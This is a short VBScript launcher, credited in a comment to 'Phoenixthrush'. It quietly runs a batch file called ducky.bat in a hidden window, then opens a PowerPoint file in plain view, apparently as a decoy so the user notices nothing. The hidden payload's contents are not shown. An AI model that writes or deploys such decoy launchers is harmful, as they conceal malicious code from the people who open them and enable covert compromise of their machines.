set WshShell = wscript.createobject("WScript.shell")
WshShell.run """.\ducky.bat"" ", 0, true
WshShell.run """.\powerpoint.pptx"" ", 3, true

' Copyright Phoenixthrush